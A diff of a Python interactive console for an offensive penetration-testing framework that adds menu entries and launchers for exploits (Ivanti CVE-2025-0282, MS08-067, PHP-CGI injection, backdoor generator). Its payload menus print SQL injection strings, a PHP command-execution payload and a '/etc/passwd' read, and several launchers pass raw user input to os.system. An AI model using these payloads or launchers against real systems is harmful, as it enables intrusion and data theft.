@@ -179,9 +179,9 @@ color.warning + color.red + color.green + """
     print()
     print()
     print()
-    print(color.white + "        +[ " + color.red + "sc_framework v1.8" + color.white + "                           ]+")
-    print("        -* 69 exploits - 29 auxiliary - 23 cve exploits *-")
-    print("        -* 11 payloads *-")
+    print(color.white + "        +[ " + color.red + "sc_framework v1.9" + color.white + "                           ]+")
+    print("        -* 81 exploits - 31 auxiliary - 24 cve exploits *-")
+    print("        -* 19 payloads *-")
     print()
     print("sc_framework tip: type '" + color.blue + "help" + color.white + "' to see the " + color.underline + color.green + "scconsole" + color.white + " commands.")
     print()
@@ -293,7 +293,19 @@ search [ exploits | exploit | windows | site | cve-exploits ]
 """ + color.red + """scanner/ftp-anon""" + color.white + """                                    25/04/08 09:54       scans target port 21 to if anonymous access is enabled on port 21 (ftp port).
 """ + color.red + """scanner/portmap-amp""" + color.white + """                                 25/04/08 10:01       attempts to connect to a web server at the specified IP address and checks the response for indicators of an AMP stack (Apache, MySQL, PHP).
 """ + color.red + """scanner/subdomain-scan""" + color.white + """                              25/04/10 08:05       This scanner exploits the subdomain scanner to look for specific subdomains by using a wordlist.
-""" + color.red + """scanner/portscan""" + color.red + """                                      25/04/10 08:13       scans the port you specified to see they are open or closed.
+""" + color.red + """scanner/portscan""" + color.white + """                                    25/04/10 08:13       scans the port you specified to see they are open or closed.
+""" + color.red + """scanner/ping_ip_site""" + color.white + """                                25/04/15 09:49       uses ping tool to make sure target or website is reachable.
+""" + color.red + """server/php-cgi-arg-injection""" + color.white + """                        25/04/16 06:02        This exploit exploits a vulnerability in the PHP CGI (Common Gateway Interface) that allows an attacker to execute arbitrary commands on the server.
+""" + color.red + """multi/cve-2025-0282""" + color.white + """                                 25/04/18 07:25       Ivanti Connect Secure 22.7R2.5  - Remote Code Execution (RCE).
+""" + color.red + """multi/generate_backdoor""" + color.white + """                             25/04/24 12:38       This exploit uses scpgenerator to generate a backdoor for you.
+""" + color.red + """multi/nc-listener""" + color.white + """                                   25/04/25 04:24       starts a listener with netcat (netcat reqires!).
+""" + color.red + """windows/ms08_067_netapi""" + color.white + """                             25/02/26 04:12       MS08-067 vulnerability in the NetAPI32 service on Windows XP and Server 2003. It exploits a stack-based buffer overflow in the NetApi32.dll library.
+""" + color.red + """php/WordPress_Core_6-2_Directory_Traversal""" + color.white + """          25/04/27 12:34       WordPress Core 6.2 - Directory Traversal.
+""" + color.red + """dos/Apache_Commons_FileUpload_and_Apache_Tomcat_DoS""" + color.white + """ 25/04/27 12:55       Apache Commons FileUpload and Apache Tomcat DoS.
+""" + color.red + """site/Apache_commons_text_RCE""" + color.white + """                        25/04/28 10:17       This exploit demonstrates an RCE vector via POST data, differing.
+""" + color.red + """scanner/http-options""" + color.white + """                                25/05/01 03:41       scan the specified host for the available HTTP methods and print the results.
+""" + color.red + """scanner/https-options""" + color.white + """                               25/05/01 03:43       scan the specified host for the available HTTP methods and print the results.
+""" + color.red + """scanner/server-scanner""" + color.white + """                              25/05/01 04:06       It sends an HTTP GET request to the target URL and retrieves the server headers. If the server header indicates PHP, it extracts the PHP version and returns it.
 """)
     elif scconsole == "search exploit":
         print("""
@@ -320,6 +332,7 @@ search [ exploits | exploit | windows | site | cve-exploits ]
 """ + color.red + """windows/MS04-007_LSASS-exe_Pro_Remote_DoS""" + color.white + """ 04/02/14 04/37       Microsoft Windows - ASN.1 'LSASS.exe' Remote Denial of Service (MS04-007).
 """ + color.red + """windows/shell-storm""" + color.white + """                       25/02/23 08:00       trys to send buffer overflow and take a shellcode.
 """ + color.red + """windows/reverse_tcp""" + color.white + """                       25/02/28 04:49       send a payload to the target machine, if success, connect back to attacker machine.
+""" + color.red + """windows/ms08_067_netapi""" + color.white + """                   25/02/26 04:12       MS08-067 vulnerability in the NetAPI32 service on Windows XP and Server 2003. It exploits a stack-based buffer overflow in the NetApi32.dll library.
 """)
     elif scconsole == "search site":
         print("""
@@ -339,6 +352,7 @@ search [ exploits | exploit | windows | site | cve-exploits ]
 """ + color.red + """site/Aurba-501""" + color.white + """                         24/08/24 05:14       Remote Command Execution | Aurba 501.
 """ + color.red + """site/HughesNet-HT2000W-Satellite-Modem""" + color.white + """ 24/08/24 09:58       HughesNet HT2000W Satellite Modem (Arcadyan httpd 1.0) - Password Reset.
 """ + color.red + """site/Devika-v1-Path-Traversal""" + color.white + """          24/08/04 12:08       Devika v1 - Path Traversal via 'snapshot_path' Parameter.
+""" + color.red + """site/Apache_commons_text_RCE""" + color.white + """           25/04/28 10:17       This exploit demonstrates an RCE vector via POST data, differing.
 """)
     elif scconsole == "search cve-exploits":
         print()
@@ -354,15 +368,16 @@ search [ exploits | exploit | windows | site | cve-exploits ]
         print(color.red + "tools/cve-exploits/OpenSSH_5-3p1_cve-2022-28123" + color.white + "        22/04/08 11:21       OpenSSH 5.3p1 cve-2022-28123 exploit.")
         print(color.red + "tools/cve-exploits/cve-2023-22518" + color.white + "                      23/09/29 02:19       allow unauthenticated attackers with network access to the Confluence Instance to restore the database of the Confluence instance.")
         print(color.red + "tools/cve-exploits/7-zip_cve-2025-0411" + color.white + "                 25/02/04 04:18       This flaw bypasses Windows' MotW protections, allowing remote code execution via malicious archives.")
-        print(color.red + "tools/PCMan_FTP_Server-2_0-pwd_Remote_Buffer_Overflow" + color.white + "  23/09/25 07:11       PCMan FTP Server 2.0 pwd Remote Buffer Overflow.")
-        print(color.red + "tools/Heartbleed_cve-2014-0160" + color.white + "                         14/04/12 12:03       Heartbleed is a critical vulnerability in the OpenSSL library that allows attackers to steal sensitive information from compromised systems.")
-        print(color.red + "tools/POODLE_cve-2014-3566" + color.white + "                             14/02/06 05:07       POODLE is a vulnerability in the SSL/TLS protocol that allows attackers to decrypt encrypted traffic.")
-        print(color.red + "tools/Slammer_cve-2007-5391" + color.white + "                            07/05/23 01:12       Slammer is a worm-like exploit that targets vulnerable systems running the Windows operating system.")
-        print(color.red + "tools/cve-2022-24521" + color.white + "                                   22/04/12 10:43       CVE-2022-24521 is a stack-based buffer overflow vulnerability in the login.cgi script of the Cisco Small Business 7000 Series IP Phones, which allows an unauthenticated attacker to execute arbitrary commands on the device.")
-        print(color.red + "tools/cve-2010-2730" + color.white + "                                    10/06/12 07:11       Buffer overflow in Microsoft Internet Information Services (IIS) 7.5, when FastCGI is enabled, allows remote attackers to execute arbitrary code via crafted headers in a request.")
-        print(color.red + "tools/cve-2025-0001" + color.white + "                                    25/01/01 04:07       Remote Code Execution in Apache HTTP Server 2.4.54.")
-        print(color.red + "tools/cve-2025-0006" + color.white + "                                    25/01/01 04:27       SQL Injection in MySQL 8.0.28.")
-        print(color.red + "tools/DocsGPT_0-12-0_RCE" + color.white + "                               25/04/09 11:34       DocsGPT 0.12.0 - Remote Code Execution")
+        print(color.red + "tools/cve-exploits/PCMan_FTP_Server-2_0-pwd_Remote_Buffer_Overflow" + color.white + "23/09/25 07:11       PCMan FTP Server 2.0 pwd Remote Buffer Overflow.")
+        print(color.red + "tools/cve-exploits/Heartbleed_cve-2014-0160" + color.white + "            14/04/12 12:03       Heartbleed is a critical vulnerability in the OpenSSL library that allows attackers to steal sensitive information from compromised systems.")
+        print(color.red + "tools/cve-exploits/POODLE_cve-2014-3566" + color.white + "                14/02/06 05:07       POODLE is a vulnerability in the SSL/TLS protocol that allows attackers to decrypt encrypted traffic.")
+        print(color.red + "tools/cve-exploits/Slammer_cve-2007-5391" + color.white + "               07/05/23 01:12       Slammer is a worm-like exploit that targets vulnerable systems running the Windows operating system.")
+        print(color.red + "tools/cve-exploits/cve-2022-24521" + color.white + "                      22/04/12 10:43       CVE-2022-24521 is a stack-based buffer overflow vulnerability in the login.cgi script of the Cisco Small Business 7000 Series IP Phones, which allows an unauthenticated attacker to execute arbitrary commands on the device.")
+        print(color.red + "tools/cve-exploits/cve-2010-2730" + color.white + "                       10/06/12 07:11       Buffer overflow in Microsoft Internet Information Services (IIS) 7.5, when FastCGI is enabled, allows remote attackers to execute arbitrary code via crafted headers in a request.")
+        print(color.red + "tools/cve-exploits/cve-2025-0001" + color.white + "                       25/01/01 04:07       Remote Code Execution in Apache HTTP Server 2.4.54.")
+        print(color.red + "tools/cve-exploits/cve-2025-0006" + color.white + "                       25/01/01 04:27       SQL Injection in MySQL 8.0.28.")
+        print(color.red + "tools/cve-exploits/DocsGPT_0-12-0_RCE" + color.white + "                  25/04/09 11:34       DocsGPT 0.12.0 - Remote Code Execution")
+        print(color.red + "tools/cve-exploits/cve-2025-0282" + color.white + "                       25/04/18 07:25       Ivanti Connect Secure 22.7R2.5  - Remote Code Execution (RCE).")
         print()
         print("You can't run these exploits from here, you need to run them from ",os.getcwd(),"/tools/cve-exploits/")
         print()
@@ -381,6 +396,9 @@ search [ exploits | exploit | windows | site | cve-exploits ]
 """ + color.red + """multi/nmap-version-detection""" + color.white + """                        25/04/04 10:35       uses nmap to detect version.
 """ + color.red + """multi/ble-bypass""" + color.white + """                                    25/04/05 04:14       This is a vulnerability in the BLE protocol that allows attackers to bypass security measures and gain unauthorized access to a target system. The exploit involves exploiting a flaw in the encryption used in BLE connections.
 """ + color.red + """multi/ble-scanner""" + color.white + """                                   25/04/04 11:01       scans bluetooths around you (sudo permission needed!).
+""" + color.red + """multi/cve-2025-0282""" + color.white + """                                 25/04/18 07:25       Ivanti Connect Secure 22.7R2.5  - Remote Code Execution (RCE).
+""" + color.red + """multi/generate_backdoor""" + color.white + """                             25/04/24 12:38       This exploit uses scpgenerator to generate a backdoor for you.
+""" + color.red + """multi/nc-listener""" + color.white + """                                   25/04/25 04:24       starts a listener with netcat (netcat reqires!).
 """)
     elif scconsole == "search osx":
         print("""
@@ -405,6 +423,7 @@ search [ exploits | exploit | windows | site | cve-exploits ]
 """ + color.red + """server/extract_table_db_column""" + color.white + """                      25/02/08 09:30        extract sensitive information with the payloads have, extract informations like tables, columns, databases.
 """ + color.red + """server/cve-2025-0001""" + color.white + """                                25/01/01 04:07        Remote Code Execution in Apache HTTP Server 2.4.54.
 """ + color.red + """server/cve-2025-0006""" + color.white + """                                25/01/01 04:27        SQL Injection in MySQL 8.0.28.
+""" + color.red + """server/php-cgi-arg-injection""" + color.white + """                        25/04/16 06:02        This exploit exploits a vulnerability in the PHP CGI (Common Gateway Interface) that allows an attacker to execute arbitrary commands on the server.
 """)
     elif scconsole == "search dos":
         print("""
@@ -412,6 +431,7 @@ search [ exploits | exploit | windows | site | cve-exploits ]
 """ + color.red + """dos/ciscodos""" + color.white + """                                            03/07/22 10:07       Remote DoS against the recent Cisco IOS vuln.
 """ + color.red + """dos/DD_D_Attack""" + color.white + """                                         25/02/01 02:01       for DoS and DDoS Attack (If your Internet is slow, that's gonna works slowly!).
 """ + color.red + """dos/ble-dos""" + color.white + """                                             25/04/05 16:35       scans the bluetooths around you and then let you to choose target, trys to connect, then starts the attack.
+""" + color.red + """dos/Apache_Commons_FileUpload_and_Apache_Tomcat_DoS""" + color.white + """     25/04/27 12:55       Apache Commons FileUpload and Apache Tomcat DoS.
 """)
     elif scconsole == "search php":
         print("""
@@ -420,6 +440,7 @@ search [ exploits | exploit | windows | site | cve-exploits ]
 """ + color.red + """php/SOPlanning_1-52-01_RCE""" + color.white + """                              24/11/15 08:29       SOPlanning 1.52.01 (Simple Online Planning Tool) - Remote Code Execution (RCE)(Authenticated).
 """ + color.red + """php/Wp2Fac""" + color.white + """                                              23/09/08 09:24       Wp2Fac - OS Command Injection.
 """ + color.red + """php/POST-request""" + color.white + """                                        25/03/14 12:53       aims to upload a PHP file with a command execution payload to a vulnerable upload URL.
+""" + color.red + """php/WordPress_Core_6-2_Directory_Traversal""" + color.white + """              25/04/27 12:34       WordPress Core 6.2 - Directory Traversal.
 """)
     elif scconsole == "search auxiliary":
         print("""
@@ -453,6 +474,8 @@ search [ exploits | exploit | windows | site | cve-exploits ]
 """ + color.red + """auxiliary/coldfusion_rce""" + color.white + """                                25/03/20 05:30       This module exploits ColdFusion remote command execution vulnerabilities to execute arbitrary commands.
 """ + color.red + """auxiliary/http-form-brute""" + color.white + """                               25/03/21 11:19       This module attempts to brute-force HTTP form logins using a specified list of credentials.
 """ + color.red + """auxiliary/sqli-xss-vuln""" + color.white + """                                 25/04/10 08:33       This exploit is for WEB Vulnerabilitie test, to test teh target website to see if it is vulnerable to sqli or xss.
+""" + color.red + """auxiliary/check-login-vuln""" + color.white + """                              25/04/15 10:15       This exploit uses 10 sql injection payloads to find a vulnerabilitie on target login page.
+""" + color.red + """auxiliary/password_cracking/crack_password""" + color.white + """              25/04/16 06:28       cracks the password hash with the wordlist and hash type you entered.
 """)
     elif scconsole == "search sniffer":
         print("""
@@ -476,6 +499,10 @@ search [ exploits | exploit | windows | site | cve-exploits ]
 """ + color.red + """scanner/portmap-amp""" + color.white + """                                     25/04/08 10:01       attempts to connect to a web server at the specified IP address and checks the response for indicators of an AMP stack (Apache, MySQL, PHP).
 """ + color.red + """scanner/subdomain-scan""" + color.white + """                                  25/04/10 08:05       This scanner exploits the subdomain scanner to look for specific subdomains by using a wordlist.
 """ + color.red + """scanner/portscan""" + color.white + """                                        25/04/10 08:13       scans the port you specified to see they are open or closed.
+""" + color.red + """scanner/ping_ip_site""" + color.white + """                                    25/04/15 09:49       uses ping tool to make sure target or website is reachable.
+""" + color.red + """scanner/http-options""" + color.white + """                                    25/05/01 03:41       scan the specified host for the available HTTP methods and print the results.
+""" + color.red + """scanner/https-options""" + color.white + """                                   25/05/01 03:43       scan the specified host for the available HTTP methods and print the results.
+""" + color.red + """scanner/server-scanner""" + color.white + """                                  25/05/01 04:06       It sends an HTTP GET request to the target URL and retrieves the server headers. If the server header indicates PHP, it extracts the PHP version and returns it.
 """)
     elif scconsole == "show payloads":
         print("""
@@ -500,6 +527,22 @@ search [ exploits | exploit | windows | site | cve-exploits ]
 """ + color.green + """javascript:alert('XSS')""" + color.white + """  ---> cross site XSS javascript payload.
 
 """ + color.green + """shell_reverse_tcp""" + color.white + """ ---> trys to get a reverse shell from target, then connects back to the attacker.
+
+""" + color.green + """UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--""" + color.white + """   ---> SQL Injection union payload.
+
+""" + color.green + """admin' OR 1=1 LIMIT 1--""" + color.white + """   ---> SQL Injection payload.
+
+""" + color.green + """;echo system($_GET["cmd"]);//""" + color.white + """   ---> Command execution payload.
+
+""" + color.green + """reverse_tcp""" + color.white + """ ---> trys to get a reverse shell from target, then connects back to the attacker.
+
+""" + color.green + """bind_tcp""" + color.white + """ ---> trys to get a reverse shell from target, then connects back to the attacker.
+
+""" + color.green + """php_reverse_shell""" + color.white + """ ---> trys to get a reverse shell with php from target, then connects back to the attacker.
+
+""" + color.green + """bash_reverse_shell""" + color.white + """ ---> trys to get a reverse shell with bash from target, then connects back to the attacker.
+
+""" + color.green + """ruby_reverse_shell""" + color.white + """ ---> trys to get a reverse shell from target, then connects back to the attacker.
 """)
     elif scconsole == "db_scscanner -h":
         print("""
@@ -516,7 +559,7 @@ Options:
   -h --->   Display this help message
   -p --->   Scan specific ports on a host
   -o --->   Scan for the operating system of a host from 7,21,22,80 and 8080 ports
-  -w --->   Scan a website for good information
+  -w --->   Scan a website for open ports from 1 to 65536
   results --->   Display the scans you done
   -n-scan --->   Normal scan
 
@@ -544,7 +587,7 @@ Options:
   -h --->   Display this help message
   -p --->   Scan specific ports on a host
   -o --->   Scan for the operating system of a host from 7,21,22,80 and 8080 ports
-  -w --->   Scan a website for good information
+  -w --->   Scan a website for open ports from 1 to 65536
   results --->   Display the scans you done
   -n-scan --->   Normal scan
 
@@ -992,6 +1035,62 @@ sudo reqired!!
         time.sleep(0.5)
         print("using auxiliary/sqli-xss-vuln.")
         aauxiliarysqlixssvuln()
+    elif scconsole == "use scanner/ping_ip_site":
+        time.sleep(0.5)
+        print("using scanner/ping_ip_site.")
+        scannerpingipsite()
+    elif scconsole == "use auxiliary/check-login-vuln":
+        time.sleep(0.5)
+        print("using auxiliary/check-login-vuln.")
+        auxiliarycheckloginvuln()
+    elif scconsole == "use server/php-cgi-arg-injection":
+        time.sleep(0.5)
+        print("using server/php-cgi-arg-injection.")
+        serverphpcgiarginjection()
+    elif scconsole == "use auxiliary/password_cracking/crack_password":
+        time.sleep(0.5)
+        print("using auxiliary/password_cracking/crack_password.")
+        auxiliarypasswordcrackingcrackpassword()
+    elif scconsole == "use multi/cve-2025-0282":
+        time.sleep(0.5)
+        print("using multi/cve-2025-0282.")
+        multicve20250282()
+    elif scconsole == "use multi/generate_backdoor":
+        time.sleep(0.5)
+        print("using multi/generate_backdoor.")
+        multigeneratebackdoor()
+    elif scconsole == "use multi/nc-listener":
+        time.sleep(0.5)
+        print("using multi/nc-listener.")
+        multinclistener()
+    elif scconsole == "use windows/ms08_067_netapi":
+        time.sleep(0.5)
+        print("using windows/ms08_067_netapi.")
+        windowsms08067netapi()
+    elif scconsole == "use php/WordPress_Core_6-2_Directory_Traversal":
+        time.sleep(0.5)
+        print("using php/WordPress_Core_6-2_Directory_Traversal.")
+        phpWordPressCore62DirectoryTraversal()
+    elif scconsole == "use dos/Apache_Commons_FileUpload_and_Apache_Tomcat_DoS":
+        time.sleep(0.5)
+        print("using dos/Apache_Commons_FileUpload_and_Apache_Tomcat_DoS.")
+        dosApacheCommonsFileUploadandApacheTomcatDoS()
+    elif scconsole == "use site/Apache_commons_text_RCE":
+        time.sleep(0.5)
+        print("using site/Apache_commons_text_RCE.")
+        siteApachecommonstextRCE()
+    elif scconsole == "use scanner/http-options":
+        time.sleep(0.5)
+        print("using scanner/http-options.")
+        scannerhttpoptions()
+    elif scconsole == "use scanner/https-options":
+        time.sleep(0.5)
+        print("using scanner/https-options.")
+        scannerhttpsoptions()
+    elif scconsole == "use scanner/server-scanner":
+        time.sleep(0.5)
+        print("using scanner/server-scanner.")
+        scannerserverscanner()
     elif scconsole == "use system commands":
             OSconsole()
             OSconsole()
@@ -5371,6 +5470,593 @@ you will specifiy these options when you run or exploit it!
         time.sleep(0.5)
         Console()
     elif scconsole120 == "exit":
+        exit()
+
+def scannerpingipsite():
+    scconsole121 = input("sc~" + color.red + "(scanner/ping_ip_site)" + color.white + ">")
+    if scconsole121 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        scannerpingipsite()
+    elif scconsole121 == "clear":
+        os.system('clear')
+        scannerpingipsite()
+    elif scconsole121 == "show options":
+        print("""
+1.
+OPTIONS       | DISCREPTIONS
+--------------|----------------------
+WEBSITE       | specify target url.
+
+2.
+OPTIONS       | DISCREPTIONS
+--------------|----------------------
+IP_ADDRESS    | specify target url.
+
+you will specifiy these options when you run or exploit it!
+this exploit can scan wensite and ip address!
+""")
+        scannerpingipsite()
+    elif scconsole121 == "run":
+        os.system('python exploits/scanner/ping_ip_site.py')
+        scannerpingipsite()
+    elif scconsole121 == "exploit":
+        os.system('python exploits/scanner/ping_ip_site.py')
+        scannerpingipsite()
+    elif scconsole121 == "unuse":
+        print("unusing scanner/ping_ip_site.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole121 == "exit":
+        exit()
+
+def auxiliarycheckloginvuln():
+    scconsole122 = input("sc~" + color.red + "(auxiliary/check-login-vuln)" + color.white + ">")
+    if scconsole122 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        auxiliarycheckloginvuln()
+    elif scconsole122 == "clear":
+        os.system('clear')
+        auxiliarycheckloginvuln()
+    elif scconsole122 == "show options":
+        print("""
+OPTIONS       | DISCREPTIONS
+--------------|----------------------
+URL           | specify target url.
+
+you will specifiy these options when you run or exploit it!
+""")
+        auxiliarycheckloginvuln()
+    elif scconsole122 == "run":
+        os.system('python exploits/auxiliary/check-login-vuln.py')
+        auxiliarycheckloginvuln()
+    elif scconsole122 == "exploit":
+        os.system('python exploits/auxiliary/check-login-vuln.py')
+        auxiliarycheckloginvuln()
+    elif scconsole122 == "unuse":
+        print("unusing auxiliary/check-login-vuln.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole122 == "exit":
+        exit()
+
+def serverphpcgiarginjection():
+    scconsole123 = input("sc~" + color.red + "(server/php-cgi-arg-injection)" + color.white + ">")
+    if scconsole123 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+show payloads ---> shows the payloads you can use in this exploit.
+""")
+        serverphpcgiarginjection()
+    elif scconsole123 == "clear":
+        os.system('clear')
+        serverphpcgiarginjection()
+    elif scconsole123 == "show options":
+        print("""
+OPTIONS       | DISCREPTIONS
+--------------|----------------------
+VULN_URL      | specify target vulnerable url.
+CHECK_STRING  | specify a string to check if execution was successful.
+PAYLOAD       | specify the paylaod.
+
+you will specifiy these options when you run or exploit it!
+""")
+        serverphpcgiarginjection()
+    elif scconsole123 == "show payloads":
+        print("""
+""" + color.green + """;echo system($_GET["cmd"]);//""" + color.white + """   ---> Command execution payload.
+
+""" + color.green + """;cat /etc/passwd""" + color.white + """  ---> remote code execute cat payload.
+""")
+        serverphpcgiarginjection()
+    elif scconsole123 == "run":
+        os.system('python exploits/server/php-cgi-arg-injection.py')
+        serverphpcgiarginjection()
+    elif scconsole123 == "exploit":
+        os.system('python exploits/server/php-cgi-arg-injection.py')
+        serverphpcgiarginjection()
+    elif scconsole123 == "unuse":
+        print("unusing server/php-cgi-arg-injection.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole123 == "exit":
+        exit()
+
+def auxiliarypasswordcrackingcrackpassword():
+    scconsole124 = input("sc~" + color.red + "(auxiliary/password_cracking/crack_password)" + color.white + ">")
+    if scconsole124 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        auxiliarypasswordcrackingcrackpassword()
+    elif scconsole124 == "clear":
+        os.system('clear')
+        auxiliarypasswordcrackingcrackpassword()
+    elif scconsole124 == "show options":
+        print("""
+OPTIONS       | DISCREPTIONS
+--------------|----------------------
+HASH_TYPE     | specify the hash type.
+HASH          | specify the hash to crack.
+WORDLIST      | specify the wordlist to start cracking.
+
+you will specifiy these options when you run or exploit it!
+""")
+        auxiliarypasswordcrackingcrackpassword()
+    elif scconsole124 == "run":
+        os.system('python exploits/auxiliary/password_cracking/crack_password.py')
+        auxiliarypasswordcrackingcrackpassword()
+    elif scconsole124 == "exploit":
+        os.system('python exploits/auxiliary/password_cracking/crack_password.py')
+        auxiliarypasswordcrackingcrackpassword()
+    elif scconsole124 == "unuse":
+        print("unusing auxiliary/password_cracking/crack_password.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole124 == "exit":
+        exit()
+
+def multicve20250282():
+    scconsole124 = input("sc~" + color.red + "(multi/cve-2025-0282)" + color.white + ">")
+    if scconsole124 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        multicve20250282()
+    elif scconsole124 == "clear":
+        os.system('clear')
+        multicve20250282()
+    elif scconsole124 == "show options":
+        print("""
+OPTIONS       | DISCREPTIONS
+--------------|----------------------
+RHOST         | specify target ip address.
+LOCAL_SHELL   | specify the local shell path.
+
+you will specifiy these options when you run or exploit it!
+""")
+        multicve20250282()
+    elif scconsole124 == "run":
+        targetipadd12 = input("Enter target IP ADDRESS: ")
+        localshellpath = input("Enter local shell path: ")
+        os.system(f'python exploits/multi/cve-2025-0282.py {targetipadd12} {localshellpath}')
+        multicve20250282()
+    elif scconsole124 == "exploit":
+        targetipadd13 = input("Enter target IP ADDRESS: ")
+        localshellpath1 = input("Enter local shell path: ")
+        os.system(f'python exploits/multi/cve-2025-0282.py {targetipadd13} {localshellpath1}')
+        multicve20250282()
+    elif scconsole124 == "unuse":
+        print("unusing multi/cve-2025-0282.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole124 == "exit":
+        exit()
+
+def multigeneratebackdoor():
+    scconsole125 = input("sc~" + color.red + "(multi/generate_backdoor)" + color.white + ">")
+    if scconsole125 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+show payloads ---> shows the payloads you can use in this exploit.
+""")
+        multigeneratebackdoor()
+    elif scconsole125 == "clear":
+        os.system('clear')
+        multigeneratebackdoor()
+    elif scconsole125 == "show options":
+        print("""
+OPTIONS       | DISCREPTIONS
+--------------|----------------------
+LHOST         | specify the listening host.
+LPORT         | specify the listening port.
+OUTPUT        | specify the output name to save the backdoor.
+
+you will specifiy these options when you run or exploit it!
+""")
+        multigeneratebackdoor()
+    elif scconsole125 == "show payloads":
+        print("""
+""" + color.green + """reverse_tcp""" + color.white + """ ---> trys to get a reverse shell from target, then connects back to the attacker.
+
+""" + color.green + """bind_tcp""" + color.white + """ ---> trys to get a reverse shell from target, then connects back to the attacker.
+""")
+        multigeneratebackdoor()
+    elif scconsole125 == "run":
+        os.system('python exploits/multi/generate_backdoor.py')
+        multigeneratebackdoor()
+    elif scconsole125 == "exploit":
+        os.system('python exploits/multi/generate_backdoor.py')
+        multigeneratebackdoor()
+    elif scconsole125 == "unuse":
+        print("unusing multi/generate_backdoor.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole125 == "exit":
+        exit()
+
+def multinclistener():
+    scconsole126 = input("sc~" + color.red + "(multi/nc-listener)" + color.white + ">")
+    if scconsole126 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        multinclistener()
+    elif scconsole126 == "clear":
+        os.system('clear')
+        multinclistener()
+    elif scconsole126 == "show options":
+        print("""
+OPTIONS       | DISCREPTIONS
+--------------|----------------------
+LPORT         | specify the listening port.
+
+you will specifiy these options when you run or exploit it!
+""")
+        multinclistener()
+    elif scconsole126 == "run":
+        listenerport342 = int(input("Enter the listening port: "))
+        os.system(f'python exploits/multi/nc-listener.py {listenerport342}')
+        multinclistener()
+    elif scconsole126 == "exploit":
+        listenerport343 = int(input("Enter the listening port: "))
+        os.system(f'python exploits/multi/nc-listener.py {listenerport343}')
+        multinclistener()
+    elif scconsole126 == "unuse":
+        print("unusing multi/nc-listener.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole126 == "exit":
+        exit()
+
+def windowsms08067netapi():
+    scconsole127 = input("sc~" + color.red + "(windows/ms08_067_netapi)" + color.white + ">")
+    if scconsole127 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        windowsms08067netapi()
+    elif scconsole127 == "clear":
+        os.system('clear')
+        windowsms08067netapi()
+    elif scconsole127 == "show options":
+        print("""
+OPTIONS       | DISCREPTIONS
+--------------|----------------------
+RHOST         | specify the target ip address.
+LHOST         | specify the listening host.
+LPORT         | specify the listening port.
+
+you will specifiy these options when you run or exploit it!
+""")
+        windowsms08067netapi()
+    elif scconsole127 == "run":
+        os.system('python exploits/windows/ms08_067_netapi.py')
+        windowsms08067netapi()
+    elif scconsole127 == "exploit":
+        os.system('python exploits/windows/ms08_067_netapi.py')
+        windowsms08067netapi()
+    elif scconsole127 == "unuse":
+        print("unusing windows/ms08_067_netapi.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole127 == "exit":
+        exit()
+
+def phpWordPressCore62DirectoryTraversal():
+    scconsole128 = input("sc~" + color.red + "(php/WordPress_Core_6-2_Directory_Traversal)" + color.white + ">")
+    if scconsole128 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        phpWordPressCore62DirectoryTraversal()
+    elif scconsole128 == "clear":
+        os.system('clear')
+        phpWordPressCore62DirectoryTraversal()
+    elif scconsole128 == "show options":
+        print("""
+OPTIONS       | DISCREPTIONS
+--------------|----------------------
+URL           | specify the target url.
+
+you will specifiy these options when you run or exploit it!
+""")
+        phpWordPressCore62DirectoryTraversal()
+    elif scconsole128 == "run":
+        os.system('python exploits/php/WordPress_Core_6-2_Directory_Traversal.py')
+        phpWordPressCore62DirectoryTraversal()
+    elif scconsole128 == "exploit":
+        os.system('python exploits/php/WordPress_Core_6-2_Directory_Traversal.py')
+        phpWordPressCore62DirectoryTraversal()
+    elif scconsole128 == "unuse":
+        print("unusing php/WordPress_Core_6-2_Directory_Traversal.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole128 == "exit":
+        exit()
+
+def dosApacheCommonsFileUploadandApacheTomcatDoS():
+    scconsole129 = input("sc~" + color.red + "(dos/Apache_Commons_FileUpload_and_Apache_Tomcat_DoS)" + color.white + ">")
+    if scconsole129 == "help":
+        print("""
+help ---> to see this help menu.
